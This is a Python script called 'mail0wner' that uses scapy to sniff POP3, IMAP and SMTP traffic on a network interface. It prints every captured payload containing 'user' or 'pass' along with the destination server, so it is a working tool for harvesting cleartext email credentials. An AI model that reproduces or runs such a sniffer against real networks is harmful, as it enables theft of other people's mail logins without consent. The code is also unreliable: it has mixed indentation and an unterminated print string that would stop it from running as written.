#!/usr/bin/env python
# -*- coding: utf-8 -*-
import os
import sys
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
logging.info("finished")
logging.captureWarnings(True)
from scapy.all import *
from time import sleep as sleep
import random
import netifaces
from optparse import OptionParser
#supress annoying scapy warnings
import requests.packages.urllib3
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()

parser = OptionParser(usage="usage: sudo %prog [options]")
parser.add_option("-t", "--time", action="store", dest="time", default=100, type=int, help="Total time to sniff packets. Default: 100")
parser.add_option("-i", "--interface", action="store", dest="iface", default="eth0", help="Interface to use. Default: eth0.")
parser.add_option("-l", "--list-interfaces", action="store_true", dest="list", default=False, help="List usable interfaces and exit.")
parser.add_option("-q", "--quiet", action="store_true", dest="quietMode", default=False, help="Dont print the huge banners at runtime")
#parser.add_option("-f", "--file", action="store", dest="infile", default=None, help="Read packets from a file") #in testing
(options, args) = parser.parse_args()

iface = options.iface
timeout = options.time
lstInt = options.list
OK_GREEN = "\033[92m"
OK_BLUE = "\033[94m"
ERR = "\033[91m"
WARN = "\033[93m"
ENDC = "\033[0m"

#handle colors
def printMsg(type, content):
	if type == "msg":
		print(OK_BLUE + "[*]" + ENDC + " " + content)
	elif type == "err":
		print(ERR + "[+]" + ENDC + " " + content)
	elif type == "good":
		print(OK_GREEN + "[*]" + ENDC + " " + content)
	elif type == "warn":
		print(WARN + "[!]" + ENDC + " " + content)
	else:
		print("Unknown type for printMsg(). Options are \"msg\", \"err\", \"good\", or \"warn\".)
    

def banner():
    banner = """\033[91m
███╗   ███╗ █████╗ ██╗██╗      ██████╗ ██╗    ██╗███╗   ██╗███████╗██████╗
████╗ ████║██╔══██╗██║██║     ██╔═████╗██║    ██║████╗  ██║██╔════╝██╔══██╗
██╔████╔██║███████║██║██║     ██║██╔██║██║ █╗ ██║██╔██╗ ██║█████╗  ██████╔╝
██║╚██╔╝██║██╔══██║██║██║     ████╔╝██║██║███╗██║██║╚██╗██║██╔══╝  ██╔══██╗
██║ ╚═╝ ██║██║  ██║██║███████╗╚██████╔╝╚███╔███╔╝██║ ╚████║███████╗██║  ██║
╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝ ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ v0.3 \033[0m
By: rndmaccess <https://github.com/rndmaccess/>
\n
"""
    print(banner)

def banner2():
    banner2x = """
\033[94m           _ _ ___
 _____ ___|_| |   |_ _ _ ___ ___ ___
|     | .'| | | | | | | |   | -_|  _|
|_|_|_|__,|_|_|___|_____|_|_|___|_| v0.3 \033[0m
By: rndmaccess <https://github.com/rndmaccess/>    """
    print(banner2x)

def banner3():
    banner3x = """
\033[92m                         ___       __
                     __ /\_ \    /'__`\\
  ___ ___      __   /\_\\\\//\ \  /\ \/\ \  __  __  __    ___      __   _ __
/' __` __`\  /'__`\ \/\ \ \ \ \ \ \ \ \ \/\ \/\ \/\ \ /' _ `\  /'__`\/\`'__\\
/\ \/\ \/\ \/\ \L\.\_\ \ \ \_\ \_\ \ \_\ \ \ \_/ \_/ \/\ \/\ \/\  __/\ \ \/
\ \_\ \_\ \_\ \__/.\_\\\\ \_\/\____\\\\ \____/\ \___x___/'\ \_\ \_\ \____\\\\ \_\\
 \/_/\/_/\/_/\/__/\/_/ \/_/\/____/ \/___/  \/__//__/   \/_/\/_/\/____/ \/_/ v0.3 \033[0m
By: rndmaccess <https://github.com/rndmaccess/>"""
    print(banner3x)

def banner4():
	banner4x = WARN + """
	               .__.__  _______                             
  _____ _____  |__|  | \   _  \__  _  ______   ___________ 
 /     \\__  \ |  |  | /  /_\  \ \/ \/ /    \_/ __ \_  __ \
|  Y Y  \/ __ \|  |  |_\  \_/   \     /   |  \  ___/|  | \/
|__|_|  (____  /__|____/\_____  /\/\_/|___|  /\___  >__|   v0.3
      \/     \/               \/           \/     \/     
	""" + ENDC
	print(banner4x)
def get_random_banner():
    bannernum = random.randrange(0,4)
    if bannernum == 0:
        banner()
    elif bannernum == 1:
        banner2()
    elif bannernum == 2:
        banner3()
    elif bannernum == 3:
        banner4()
    else:
	banner()
#packet callback for scapy (parsing packet)
def packet_callback(packet):
    if packet[TCP].payload:
        mail_packet = str(packet[TCP].payload)
        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
            printMsg("good", "Server: %s" % packet[IP].dst)
            printMsg("good", "%s" % packet[TCP].payload)

def sniffer(): # main function that starts sniffer
    try:
	if 'mon' in iface:
	    printMsg("err", "Monitor mode cards are not supported. Please use another interface.")
	    exit(1)
        #start sniffer
        printMsg("msg", "Starting Sniffer on interface: " + "\033[93m" + iface + "\033[0m")
        sleep(1)
        printMsg("msg", "Running for %i seconds..." % options.time)
        try:
            sniff(filter="tcp port 110 or tcp port 25 or tcp port 143", prn=packet_callback, store=0, timeout=timeout, iface=iface)
            #port 110 = POP3
            #port 143 = IMAP
            #port 25  = SMTP
        except socket.error as se:
            printMsg("err", "Couldn't start sniffer. Try running as root or using another interface")
        printMsg("msg", "Sniffer has finished. Thanks for using mail0wner!")
        exit(0)
    except OSError as e: #catch unknown interface OSError
        printMsg("msg", "Unknown interface: %s. (use the -i switch to specify an interface)" % options.iface)
        exit(1)
def main():
    if not os.geteuid() == 0:
        printMsg("err", "Script must be run as root. Exiting...")
        exit(-1)
    else:
        if lstInt == True:
            banner2()
            printMsg("msg", "Getting interface information...")
            sleep(1)
            ifaces = netifaces.interfaces()
            printMsg("good", "Available interfaces are: ")
            print ifaces
            exit(0)
	#elif options.infile != None:
	#	print "\n"
	#	printMsg("Reading packets from \033[93m" + options.infile + "\033[0m"
	#	pcapfile = rdpcap(options.infile)
	#	if file == None; #might cause problems
	#	    printErr("No packets in file!")
	#	else:
	#	    print file
	#	    exit(0)
        else:
    	    if options.quietMode == True:
                	sniffer() # call sniffer function
    	    else:
                get_random_banner()
                sniffer()
if __name__ == '__main__':
    main()
